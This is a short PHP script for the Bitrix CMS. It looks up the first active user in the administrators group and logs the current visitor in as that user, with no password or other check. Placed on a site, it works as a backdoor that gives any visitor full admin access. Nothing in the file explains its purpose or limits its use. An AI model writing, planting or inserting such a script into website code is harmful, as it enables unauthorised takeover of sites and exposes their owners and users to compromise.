<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");

$cUser = new CUser; 
$sort_by = "ID";
$sort_ord = "ASC";
$arFilter = array("GROUPS_ID" => 1, "ACTIVE" => 'Y');
$dbUsers = $cUser->GetList($sort_by, $sort_ord, $arFilter);
while ($arUser = $dbUsers->Fetch()) 
{
   $cUser->Authorize($arUser["ID"]);
   break;
}

require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/epilog_after.php");?>